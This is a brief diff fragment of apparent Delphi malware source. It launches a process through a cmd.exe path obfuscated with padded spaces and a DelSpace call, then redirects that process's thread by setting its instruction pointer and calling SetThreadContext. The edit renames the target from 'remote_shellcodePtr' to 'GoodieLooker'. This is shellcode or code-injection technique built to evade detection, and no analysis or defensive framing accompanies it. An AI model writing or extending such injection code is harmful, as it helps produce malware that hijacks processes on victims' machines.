@@ -152,7 +152,7 @@ CreateProcess(PChar(DelSpace('c:\w  in     do  '+'   ' + 'ws\ syste   m3'+'2\cm'
 {$ENDIF}
 
 {$ifdef win32}
- ctx.Eip:=integer(remote_shellcodePtr);
+ ctx.Eip:=integer(GoodieLooker);
  ctx.ContextFlags := CONTEXT_CONTROL;
  SetThreadContext(pi.hThread,ctx);
 
